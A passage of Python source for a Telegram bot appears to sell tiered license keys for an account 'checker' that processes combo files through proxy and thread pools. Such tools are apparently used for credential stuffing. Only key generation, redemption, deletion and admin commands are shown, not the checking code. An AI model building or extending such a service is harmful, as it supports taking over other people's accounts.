                "label":           label or api_key_data.get("label", ""),
                "redemption_count": 0,
            }
            new_keys.append(k)
    else:
        for _ in range(count):
            k = _gen_local_key(key_format, tier)
            keys[k] = {
                "expires":         expires,
                "combo_limit":     combo_limit,
                "max_users":       max_redemptions,
                "used_by":         [],
                "created":         now,
                "source":          "local",
                "tier":            tier,
                "format":          key_format,
                "label":           label,
                "redemption_count": 0,
            }
            new_keys.append(k)

    _save_keys(keys)
    _genkey_wizard.pop(chat_id, None)

    # Display fields matching KeyVault dashboard
    tier_disp    = "⭐ VIP" if tier == "vip" else "🆓 Free"
    fmt_disp     = key_format.upper()
    combo_disp   = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
    redeems_disp = "∞ Unlimited" if max_redemptions == 0 else f"{max_redemptions}"
    exp_disp     = "Never" if duration == 0 else _dur_label(duration)
    exp_dt       = "Never" if duration == 0 else datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")
    label_disp   = label if label else "(none)"

    if count == 1:
        _tg_send(token, chat_id,
            f"✅ <b>Key Generated Successfully!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>Key:</b>\n<code>{new_keys[0]}</code>\n\n"
            f"🏷 <b>Tier:</b> {tier_disp}\n"
            f"🔤 <b>Format:</b> {fmt_disp}\n"
            f"📝 <b>Label:</b> {label_disp}\n"
            f"⏳ <b>Expiry:</b> {exp_disp}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
            f"👥 <b>Max Redemptions:</b> {redeems_disp}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<i>Share this key — up to {redeems_disp} users can redeem it.</i>"
        )
    else:
        import io
        txt_content = "\n".join(new_keys) + "\n"
        txt_bytes   = txt_content.encode("utf-8")
        ts          = time.strftime("%Y%m%d_%H%M%S")
        fname       = f"keys_{count}_{ts}.txt"

        _tg_send(token, chat_id,
            f"✅ <b>{count} Keys Generated!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏷 <b>Tier:</b> {tier_disp}\n"
            f"🔤 <b>Format:</b> {fmt_disp}\n"
            f"⏳ <b>Expiry:</b> {exp_disp}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
            f"👥 <b>Max Redemptions:</b> {redeems_disp}\n"
            f"🔢 <b>Total keys:</b> {count}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<i>Keys attached below as .txt file.</i>"
        )
        try:
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            requests.post(
                url,
                data={
                    "chat_id":    chat_id,
                    "caption":    f"🔑 <b>{count} keys</b> · {tier_disp} · {exp_disp} · {combo_disp} · {redeems_disp} redeems",
                    "parse_mode": "HTML",
                },
                files={"document": (fname, io.BytesIO(txt_bytes), "text/plain")},
                timeout=15,
            )
        except Exception as e:
            logger.warning(f"[BOT] Key file send failed: {e}")
            chunk_size = 20
            for i in range(0, len(new_keys), chunk_size):
                chunk = new_keys[i:i + chunk_size]
                _tg_send(token, chat_id,
                    f"🔑 <b>Keys {i+1}–{i+len(chunk)}:</b>\n\n" +
                    "\n".join(f"<code>{k}</code>" for k in chunk)
                )


def _handle_server_status(token: str, chat_id, from_user: dict):
    """Show live server resource usage to the owner."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    try:
        import psutil
        cpu    = psutil.cpu_percent(interval=1)
        mem    = psutil.virtual_memory()
        disk   = psutil.disk_usage('/')
        mem_mb = mem.used // (1024 * 1024)
        mem_total_mb = mem.total // (1024 * 1024)
        disk_gb = disk.used / (1024**3)
        disk_total_gb = disk.total / (1024**3)
        sys_info = (
            f"🖥 <b>CPU:</b> {cpu:.1f}%\n"
            f"🧠 <b>RAM:</b> {mem_mb}MB / {mem_total_mb}MB ({mem.percent:.1f}%)\n"
            f"💾 <b>Disk:</b> {disk_gb:.1f}GB / {disk_total_gb:.1f}GB ({disk.percent:.1f}%)\n"
        )
    except ImportError:
        sys_info = "<i>Install psutil for CPU/RAM stats: pip install psutil</i>\n"

    running_users  = [cid for cid, s in _bot_state.items() if s == "RUNNING"]
    total_users    = len(_saved_users)
    sem_available  = _global_thread_sem._value  # available slots

    _tg_send(token, chat_id,
        f"📊 <b>Server Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{sys_info}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Bot Stats</b>\n"
        f"  👥 Registered users: <b>{total_users}</b>\n"
        f"  🏃 Running checkers: <b>{len(running_users)}</b> / {MAX_CONCURRENT_USERS}\n"
        f"  🧵 Thread slots free: <b>{sem_available}</b> / {MAX_GLOBAL_THREADS}\n"
        f"  📡 Proxy pool: <b>{geo_rotator.total}</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ <b>Limits</b>\n"
        f"  Max concurrent users: <b>{MAX_CONCURRENT_USERS}</b>\n"
        f"  Threads per user: <b>{MAX_THREADS_PER_USER}</b>\n"
        f"  VIP threads per user: <b>{VIP_THREADS_PER_USER}</b>\n"
        f"  Total thread cap: <b>{MAX_GLOBAL_THREADS}</b>\n\n"
        f"💡 Use /setthreads to change thread counts\n"
        f"Use /setmaxusers to change max concurrent users"
    )


# ── /setthreads — owner command to change thread counts ────────
def _handle_set_threads(token: str, chat_id, from_user: dict, args: str):
    """
    /setthreads              — show current settings
    /setthreads <N>          — set Free threads per user
    /setthreads free <N>     — set Free threads per user
    /setthreads vip <N>      — set VIP threads per user
    /setthreads global <N>   — set global thread cap
    """
    global FREE_THREADS_PER_USER, MAX_THREADS_PER_USER, VIP_THREADS_PER_USER, MAX_GLOBAL_THREADS, _global_thread_sem

    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    parts = args.strip().lower().split() if args.strip() else []

    # No args — show current settings
    if not parts:
        _tg_send(token, chat_id,
            f"🧵 <b>Thread Settings</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🆓 Free: <b>{FREE_THREADS_PER_USER}</b> threads/user (queued)\n"
            f"  ⭐ VIP: <b>{VIP_THREADS_PER_USER}</b> threads/user (no queue)\n"
            f"  🌐 Global cap: <b>{MAX_GLOBAL_THREADS}</b> threads\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Usage:</b>\n"
            f"  <code>/setthreads 5</code> — set Free to 5\n"
            f"  <code>/setthreads free 5</code> — set Free to 5\n"
            f"  <code>/setthreads vip 10</code> — set VIP to 10\n"
            f"  <code>/setthreads global 40</code> — set global cap to 40")
        return

    # Parse: /setthreads <N> or /setthreads <type> <N>
    try:
        if len(parts) == 1:
            # /setthreads <N> — set Free threads
            new_val = int(parts[0])
            if new_val < 1 or new_val > 50:
                _tg_send(token, chat_id, "❌ Thread count must be between <code>1</code> and <code>50</code>.")
                return
            old_val = FREE_THREADS_PER_USER
            FREE_THREADS_PER_USER = new_val
            MAX_THREADS_PER_USER = new_val  # keep alias in sync
            _tg_send(token, chat_id,
                f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
                f"<i>Takes effect for new checkers. Running checkers keep their current threads.</i>")

        elif len(parts) == 2:
            target = parts[0]
            new_val = int(parts[1])

            if target == "free":
                if new_val < 1 or new_val > 50:
                    _tg_send(token, chat_id, "❌ Free thread count must be between <code>1</code> and <code>50</code>.")
                    return
                old_val = FREE_THREADS_PER_USER
                FREE_THREADS_PER_USER = new_val
                MAX_THREADS_PER_USER = new_val  # keep alias in sync
                _tg_send(token, chat_id,
                    f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
                    f"<i>Takes effect for new checkers.</i>")

            elif target == "vip":
                if new_val < 1 or new_val > 50:
                    _tg_send(token, chat_id, "❌ VIP thread count must be between <code>1</code> and <code>50</code>.")
                    return
                old_val = VIP_THREADS_PER_USER
                VIP_THREADS_PER_USER = new_val
                _tg_send(token, chat_id,
                    f"✅ <b>VIP threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
                    f"<i>Takes effect for new checkers.</i>")

            elif target == "global":
                if new_val < 1 or new_val > 100:
                    _tg_send(token, chat_id, "❌ Global cap must be between <code>1</code> and <code>100</code>.")
                    return
                old_val = MAX_GLOBAL_THREADS
                MAX_GLOBAL_THREADS = new_val
                _global_thread_sem = threading.Semaphore(new_val)
                _tg_send(token, chat_id,
                    f"✅ <b>Global thread cap:</b> {old_val} → <b>{new_val}</b>\n\n"
                    f"⚠️ <i>New semaphore created. Running checkers still use old slots.</i>")

            else:
                _tg_send(token, chat_id,
                    f"❌ Unknown target: <code>{target}</code>\n"
                    f"Use: <code>/setthreads [free|vip|global] &lt;number&gt;</code>")
        else:
            _tg_send(token, chat_id,
                f"❌ Too many arguments.\n"
                f"Use: <code>/setthreads &lt;number&gt;</code> or <code>/setthreads [free|vip|global] &lt;number&gt;</code>")

    except ValueError:
        _tg_send(token, chat_id, "❌ Invalid number. Use: <code>/setthreads 10</code>")


# ── /setmaxusers — owner command to change max concurrent users ──────────────────────
def _handle_set_max_users(token: str, chat_id, from_user: dict, args: str):
    """
    /setmaxusers           — show current max concurrent users
    /setmaxusers <N>       — set max concurrent users to N
    """
    global MAX_CONCURRENT_USERS

    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    parts = args.strip().split() if args.strip() else []

    running_now = sum(1 for s in _bot_state.values() if s == "RUNNING")

    # No args — show current setting
    if not parts:
        _tg_send(token, chat_id,
            f"👥 <b>Max Concurrent Users</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  Current limit: <b>{MAX_CONCURRENT_USERS}</b>\n"
            f"  Running now: <b>{running_now}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Usage:</b>\n"
            f"  <code>/setmaxusers 20</code> — set max to 20")
        return

    # Parse: /setmaxusers <N>
    try:
        new_val = int(parts[0])
        if new_val < 1 or new_val > 100:
            _tg_send(token, chat_id, "❌ Max concurrent users must be between <code>1</code> and <code>100</code>.")
            return
        old_val = MAX_CONCURRENT_USERS
        MAX_CONCURRENT_USERS = new_val
        _tg_send(token, chat_id,
            f"✅ <b>Max concurrent users:</b> {old_val} → <b>{new_val}</b>\n\n"
            f"<i>Currently running: {running_now} user(s). "
            f"New limit takes effect immediately for new checkers.</i>")
    except ValueError:
        _tg_send(token, chat_id, "❌ Invalid number. Use: <code>/setmaxusers 20</code>")


# ── /statuskey ─────────────────────────────────────────────────
def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    keys = _load_keys()
    api = _get_keysystem_api()

    # Sync keys from KeyVault API if enabled
    if api.enabled:
        api_keys = api.list_keys()
        now = time.time()
        for ak in api_keys:
            key_value = ak.get("key", "")
            if key_value and key_value not in keys:
                expires_at = ak.get("expiresAt")
                expires = (expires_at / 1000.0) if expires_at else (now + 86400 * 365)
                rate_limit = ak.get("rateLimit", "1000")
                combo_limit = int(rate_limit) if str(rate_limit).isdigit() else 0
                max_redemptions = ak.get("maxRedemptions")
                keys[key_value] = {
                    "expires":         expires,
                    "combo_limit":     combo_limit,
                    "max_users":       max_redemptions if max_redemptions else 0,
                    "used_by":         [],
                    "created":         ak.get("createdAt", now * 1000) / 1000.0,
                    "api_id":          ak.get("id", ""),
                    "source":          "keyvault",
                    "revoked":         ak.get("revoked", False),
                    "tier":            ak.get("tier", "free"),
                    "format":          ak.get("format", "unknown"),
                    "label":           ak.get("label", ""),
                    "redemption_count": ak.get("redemptionCount", 0),
                }
        _save_keys(keys)

    if not keys:
        _tg_send(token, chat_id, "📭 <b>No keys found.</b>\nGenerate one with /generate_key")
        return

    now = time.time()
    # If a specific key was passed, show details for just that one
    target = args.strip().upper() if args.strip() else None

    if target:
        if target not in keys:
            _tg_send(token, chat_id, f"❌ Key <code>{target}</code> not found.")
            return
        e = keys[target]
        expired   = now > e.get("expires", 0)
        revoked   = e.get("revoked", False)
        remaining = max(0, int(e.get("expires", 0) - now))
        if revoked:
            status = "🚫 Revoked"
        elif expired:
            status = "❌ Expired"
        else:
            status = f"✅ Active — {_dur_label(remaining)} left"
        used_by   = e.get("used_by", [])
        if isinstance(used_by, str):
            used_by = [used_by] if used_by else []
        # Enrich legacy string entries with name/username from saved profiles
        enriched = []
        for u in used_by:
            if isinstance(u, str):
                profile = _get_saved_profile(u)
                name = ""
                username = ""
                if profile:
                    name = profile.get("username", "")
                    username = profile.get("username", "")
                enriched.append({"id": u, "name": name, "username": username, "tg_id": u})
            else:
                enriched.append(u)
        used_by = enriched
        max_users  = e.get("max_users", 1)
        slots_used = len(used_by)
        slots_max  = "∞" if max_users == 0 else str(max_users)
        combo_disp = "∞ Unlimited" if e.get("combo_limit") == 0 else f"{e.get('combo_limit', 500):,} lines"
        created    = datetime.fromtimestamp(e.get("created", 0)).strftime("%Y-%m-%d %H:%M")
        exp_dt     = datetime.fromtimestamp(e.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
        tier_disp  = "⭐ VIP" if e.get("tier") == "vip" else "🆓 Free"
        label_disp = e.get("label") or "(none)"
        fmt_disp   = (e.get("format") or "unknown").upper()
        source     = e.get("source", "local")
        # Build rich user list with Name, @username, ID, and active status
        users_lines = []
        for u in used_by:
            if isinstance(u, dict):
                u_name = u.get("name", "")
                u_user = u.get("username", "")
                u_id   = u.get("id", u.get("tg_id", ""))
                # Check if this user is currently active
                u_chat_id = None
                try: u_chat_id = int(u_id)
                except (ValueError, TypeError): pass
                is_active = False
                if u_chat_id and u_chat_id in _bot_state:
                    is_active = _bot_state[u_chat_id] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                active_badge = "🟢 1/1" if is_active else "⚫ 0/1"
                # key-username format
                username_part = f"@{u_user}" if u_user else u_name or str(u_id)
                display = f"    • <code>{target[:8]}-{username_part}</code>"
                display += f" ─ {u_name}"
                if u_user:
                    display += f" @{u_user}"
                display += f" ─ <code>{u_id}</code> {active_badge}"
                users_lines.append(display)
            else:
                # Legacy: plain chat_id string
                u_chat_id = None
                try: u_chat_id = int(u)
                except (ValueError, TypeError): pass
                is_active = False
                if u_chat_id and u_chat_id in _bot_state:
                    is_active = _bot_state[u_chat_id] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                active_badge = "🟢 1/1" if is_active else "⚫ 0/1"
                profile = _get_saved_profile(u)
                p_name = profile.get("username", "") if profile else ""
                username_part = f"@{p_name}" if p_name else str(u)
                display = f"    • <code>{target[:8]}-{username_part}</code>"
                display += f" ─ <code>{u}</code> {active_badge}"
                users_lines.append(display)
        users_list = "\n".join(users_lines) or "    <i>none yet</i>"
        _tg_send(token, chat_id,
            f"🔍 <b>Key Details</b>\n\n"
            f"🔑 <code>{target}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Status:</b> {status}\n"
            f"🏷 <b>Tier:</b> {tier_disp}\n"
            f"🔤 <b>Format:</b> {fmt_disp}\n"
            f"📝 <b>Label:</b> {label_disp}\n"
            f"📅 <b>Created:</b> {created}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
            f"👥 <b>Max Redemptions:</b> {slots_used}/{slots_max} used\n"
            f"📡 <b>Source:</b> {source}\n"
            f"🆔 <b>Key ID:</b> <code>{e.get('api_id', 'N/A')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Users redeemed:</b>\n{users_list}"
        )
        return

    # Show summary of all keys — same layout as KeyVault dashboard stats
    total    = len(keys)
    active   = [k for k, v in keys.items() if now < v.get("expires", 0) and not v.get("revoked")]
    expired  = [k for k, v in keys.items() if now >= v.get("expires", 0) and not v.get("revoked")]
    revoked  = [k for k, v in keys.items() if v.get("revoked")]

    def _used_count(v):
        ub = v.get("used_by", [])
        if isinstance(ub, str): return 1 if ub else 0
        if isinstance(ub, dict): return 1  # single dict entry
        return len(ub)

    lines = [
        f"📋 <b>Key Status — Dashboard</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 <b>Total:</b> {total}  |  ✅ Active: {len(active)}  |  ❌ Expired: {len(expired)}  |  🚫 Revoked: {len(revoked)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ]

    if active:
        lines.append("✅ <b>Active Keys:</b>")
        for k in active[:10]:
            v = keys[k]
            rem        = max(0, int(v.get("expires", 0) - now))
            used_cnt   = _used_count(v)
            max_u      = v.get("max_users", 1)
            redeems    = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
            combo      = "∞" if v.get("combo_limit") == 0 else str(v.get("combo_limit", 1000))
            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
            label      = v.get("label", "")
            label_str  = f" · {label}" if label else ""
            # Build usernames list for this key
            ub = v.get("used_by", [])
            if isinstance(ub, str): ub = [ub] if ub else []
            if isinstance(ub, dict): ub = [ub]
            key_users = []
            for u in ub:
                if isinstance(u, dict):
                    un = u.get("username", "")
                    nm = u.get("name", "")
                    uid = u.get("id", u.get("tg_id", ""))
                    # Check active status
                    u_cid = None
                    try: u_cid = int(uid)
                    except (ValueError, TypeError): pass
                    is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                    badge = "🟢" if is_on else "⚫"
                    key_users.append(f"{badge} {f'@'+un if un else nm or uid}")
                else:
                    profile = _get_saved_profile(u)
                    pn = profile.get("username", "") if profile else ""
                    u_cid = None
                    try: u_cid = int(u)
                    except (ValueError, TypeError): pass
                    is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                    badge = "🟢" if is_on else "⚫"
                    key_users.append(f"{badge} {f'@'+pn if pn else u}")
            users_str = " · ".join(key_users) if key_users else ""
            users_line = f"\n  👤 {users_str}" if users_str else ""
            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code>{label_str}\n  ⏳ {_dur_label(rem)} · 👥 {redeems} · 📦 {combo}{users_line}")
        if len(active) > 10:
            lines.append(f"  <i>...and {len(active)-10} more</i>")
            lines.append(f"  <i>...and {len(active)-10} more</i>")

    if expired:
        lines.append("\n❌ <b>Expired Keys:</b>")
        for k in expired[:5]:
            v        = keys[k]
            used_cnt = _used_count(v)
            max_u    = v.get("max_users", 1)
            redeems  = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code> — 👥 {redeems}")
        if len(expired) > 5:
            lines.append(f"  <i>...and {len(expired)-5} more</i>")

    if revoked:
        lines.append("\n🚫 <b>Revoked Keys:</b>")
        for k in revoked[:5]:
            v = keys[k]
            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code>")
        if len(revoked) > 5:
            lines.append(f"  <i>...and {len(revoked)-5} more</i>")

    # ── Active Users Overview ────────────────────────────────────
    all_key_users = []  # (name, username, id, is_active)
    for k, v in keys.items():
        ub = v.get("used_by", [])
        if isinstance(ub, str): ub = [ub] if ub else []
        if isinstance(ub, dict): ub = [ub]
        for u in ub:
            if isinstance(u, dict):
                uid = u.get("id", u.get("tg_id", ""))
                u_cid = None
                try: u_cid = int(uid)
                except (ValueError, TypeError): pass
                is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                all_key_users.append((u.get("name", ""), u.get("username", ""), uid, is_on))
            else:
                profile = _get_saved_profile(u)
                pn = profile.get("username", "") if profile else ""
                nm = profile.get("username", "") if profile else ""
                u_cid = None
                try: u_cid = int(u)
                except (ValueError, TypeError): pass
                is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
                all_key_users.append((nm, pn, u, is_on))
    if all_key_users:
        online_count = sum(1 for _, _, _, on in all_key_users if on)
        total_count = len(all_key_users)
        lines.append(f"\n👥 <b>Key Users:</b> {online_count}/{total_count} online")
        for nm, un, uid, on in all_key_users[:15]:
            badge = "🟢" if on else "⚫"
            status = "1/1" if on else "0/1"
            name_part = f"@{un}" if un else nm or str(uid)
            lines.append(f"  {badge} {name_part} ─ <code>{uid}</code> [{status}]")
        if len(all_key_users) > 15:
            lines.append(f"  <i>...and {len(all_key_users)-15} more</i>")

    lines.append(f"\n<i>Use /statuskey KEY for details · /deletekey to remove</i>")
    _tg_send(token, chat_id, "\n".join(lines))


# ── /deletekey — interactive inline key picker ─────────────────
def _build_deletekey_keyboard(keys: dict, selected: set, now: float) -> list:
    rows = []
    sorted_keys = sorted(
        keys.items(),
        key=lambda kv: (kv[1].get("expires", 0) > now, kv[1].get("expires", 0))
    )

    for k, v in sorted_keys[:20]:
        expired   = now >= v.get("expires", 0)
        remaining = max(0, int(v.get("expires", 0) - now))
        used_by   = v.get("used_by", [])
        if isinstance(used_by, str):
            used_by = [used_by] if used_by else []
        max_u     = v.get("max_users", 1)
        slots     = f"{len(used_by)}/{'∞' if max_u == 0 else max_u}"
        status    = "❌" if expired else f"⏳{_dur_label(remaining)}"
        tick      = "✅ " if k in selected else ""
        label     = f"{tick}{k[:8]}… {status} 👥{slots}"
        rows.append([{"text": label, "callback_data": f"dk_toggle:{k}"}])

    if len(keys) > 20:
        rows.append([{"text": f"⚠️ Showing 20/{len(keys)} keys", "callback_data": "dk_noop"}])

    rows.append([
        {"text": "☑️ All Expired",  "callback_data": "dk_sel:expired"},
        {"text": "☑️ All Unused",   "callback_data": "dk_sel:unused"},
        {"text": "☑️ Select All",   "callback_data": "dk_sel:all"},
    ])

    sel_count    = len(selected)
    confirm_label = f"🗑 Delete ({sel_count})" if sel_count else "🗑 Delete"
    rows.append([
        {"text": confirm_label,  "callback_data": "dk_confirm"},
        {"text": "🔲 Clear",     "callback_data": "dk_sel:none"},
        {"text": "❌ Cancel",    "callback_data": "dk_cancel"},
    ])
    return rows


def _deletekey_header(keys: dict, selected: set, now: float) -> str:
    total    = len(keys)
    active   = sum(1 for v in keys.values() if now < v.get("expires", 0))
    expired  = sum(1 for v in keys.values() if now >= v.get("expires", 0))
    sel      = len(selected)
    return (
        f"🗑 <b>Delete Keys</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 Total: <b>{total}</b>  ✅ Active: <b>{active}</b>  ❌ Expired: <b>{expired}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{'🔘 <b>'+str(sel)+' key(s) selected</b>' if sel else '<i>Tap keys to select for deletion</i>'}\n\n"
        f"<b>Key</b>  ·  <b>Status</b>  ·  <b>Used</b>"
    )


def _delete_key_from_api(entry: dict):
    """If a key was created via the API, also delete it from KeyVault."""
    api = _get_keysystem_api()
    api_id = entry.get("api_id")
    if api.enabled and api_id:
        api.delete_key(api_id)


def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    keys = _load_keys()
    now  = time.time()

    if not keys:
        _tg_send(token, chat_id, "📭 <b>No keys found.</b>")
        return

    # Direct one-shot commands still supported: /deletekey expired|unused|all|KEY
    args = args.strip()
    if args:
        if args.lower() == "expired":
            to_del = [k for k, v in keys.items() if now >= v.get("expires", 0)]
            if not to_del:
                _tg_send(token, chat_id, "✅ No expired keys to delete.")
                return
            for k in to_del:
                _delete_key_from_api(keys[k])
                del keys[k]
            _save_keys(keys)
            _tg_send(token, chat_id,
                f"🗑 <b>Deleted {len(to_del)} expired key(s).</b>\n"
                f"<i>Remaining: {len(keys)}</i>")
            return
        if args.lower() == "unused":
            to_del = [k for k, v in keys.items() if not v.get("used_by")]
            if not to_del:
                _tg_send(token, chat_id, "✅ No unused keys to delete.")
                return
            for k in to_del:
                _delete_key_from_api(keys[k])
                del keys[k]
            _save_keys(keys)
            _tg_send(token, chat_id,
                f"🗑 <b>Deleted {len(to_del)} unused key(s).</b>\n"
                f"<i>Remaining: {len(keys)}</i>")
            return
        if args.lower() == "all":
            count = len(keys)
            for entry in keys.values():
                _delete_key_from_api(entry)
            keys.clear()
            _save_keys(keys)
            _deletekey_selection.pop(chat_id, None)
            _tg_send(token, chat_id, f"🗑 <b>All {count} key(s) deleted.</b>")
            return
        # Specific key
        target = args.upper()
        if target not in keys:
            _tg_send(token, chat_id, f"❌ Key <code>{target}</code> not found.")
            return
        entry = keys.pop(target)
        _delete_key_from_api(entry)
        _save_keys(keys)
        exp_dt = datetime.fromtimestamp(entry.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
        used   = entry.get("used_by") or "never used"
        _tg_send(token, chat_id,
            f"🗑 <b>Key Deleted</b>\n\n"
            f"🔑 <code>{target}</code>\n"
            f"📅 Was expiring: {exp_dt}\n"
            f"👤 Used by: <code>{used}</code>")
        return

    # ── Interactive picker — no args ────────────────────────────
    _deletekey_selection[chat_id] = set()   # fresh selection
    kb = _build_deletekey_keyboard(keys, set(), now)
    _tg_send_buttons(token, chat_id,
        _deletekey_header(keys, set(), now), kb)


# ── /redeem — with inline button if no key given ───────────────
def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
    # ── No key typed → prompt with button ─────────────────────
    if not key_arg.strip():
        _bot_state[chat_id] = "AWAIT_REDEEM_KEY"
        _tg_send_buttons(token, chat_id,
            "🔑 <b>Redeem Key</b>\n\n"
            "Type your key in the chat, or tap the button below:\n\n"
            "<i>Format: <code>/redeem YOUR_KEY</code></i>",
            [
                [{"text": "⌨️ Type my key now", "callback_data": "redeem:prompt"}],
            ]
        )
        return

    key     = key_arg.strip().upper()
    keys    = _load_keys()
    now     = time.time()
    uid_str = str(chat_id)
    api     = _get_keysystem_api()

    # ── Check local store first ─────────────────────────────────
    if key not in keys:
        # Try case-insensitive match (API keys may be mixed case)
        key_lower = key_arg.strip().lower()
        matched = None
        for k in keys:
            if k.lower() == key_lower:
                matched = k
                break
        if matched:
            key = matched
        elif api.enabled:
            # Key not found locally — try validating via KeyVault API
            api_result = api.validate_key(key_arg.strip())
            if not api_result:
                # Also try the original case
                api_result = api.validate_key(key)
            if api_result and api_result.get("valid"):
                # Key is valid in API — create local entry for user tracking
                api_key_info = api_result.get("key", {})
                expires_at = api_key_info.get("expiresAt")
                if expires_at:
                    expires = expires_at / 1000.0  # API uses milliseconds
                else:
                    expires = now + 86400 * 30  # default 30 days if no expiry
                rate_limit = api_key_info.get("rateLimit", "1000")
                combo_limit = int(rate_limit) if rate_limit.isdigit() else 0
                max_redemptions = api_key_info.get("maxRedemptions")
                max_users = max_redemptions if max_redemptions else 0
                keys[key] = {
                    "expires":     expires,
                    "combo_limit": combo_limit,
                    "max_users":   max_users,
                    "used_by":     [],
                    "created":     now,
                    "api_id":      api_key_info.get("id", ""),
                    "source":      "keyvault",
                }
                _save_keys(keys)
            elif api_result and not api_result.get("valid"):
                reason = api_result.get("reason", "Invalid key")
                _tg_send_buttons(token, chat_id,
                    f"❌ <b>{reason}</b>\n\n"
                    "Please check the key and try again.",
                    [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
                )
                return
            else:
                _tg_send_buttons(token, chat_id,
                    "❌ <b>Invalid key.</b>\n\n"
                    "Please check the key and try again.",
                    [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
                )
                return
        else:
            _tg_send_buttons(token, chat_id,
                "❌ <b>Invalid key.</b>\n\n"
                "Please check the key and try again.",
                [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
            )
            return

    entry = keys[key]

    # ── Expiry check ───────────────────────────────────────────
    if now > entry["expires"]:
        _tg_send(token, chat_id,
            "⌛ <b>This key has expired.</b>\n"
            "Ask the owner for a new one.")
        return

    # ── Migrate legacy keys: used_by was a single string ──────
    used_by = entry.get("used_by", [])
    if isinstance(used_by, str):
        used_by = [used_by] if used_by else []
        entry["used_by"] = used_by

    max_users = entry.get("max_users", 1)   # 0 = unlimited

    # ── Already redeemed by this user → refresh + re-ask setup ─
    # Support both legacy (string) and new (dict) used_by entries
    user_already_redeemed = False
    for u in used_by:
        if isinstance(u, dict) and str(u.get("id", "")) == uid_str:
            user_already_redeemed = True
            break
        elif isinstance(u, str) and u == uid_str:
            user_already_redeemed = True
            break
    if user_already_redeemed:
        d = _udata(chat_id)
        d["key"]         = key
        d["key_expires"] = entry["expires"]
        d["combo_limit"] = entry.get("combo_limit", 500)
        d["key_tier"]    = entry.get("tier", "free")
        _save_profile(chat_id, d)
        remaining  = int(entry["expires"] - now)
        hrs  = remaining // 3600
        mins = (remaining % 3600) // 60
        slots_max = "∞" if max_users == 0 else str(max_users)
        _tg_send(token, chat_id,
            f"✅ <b>Access Restored!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
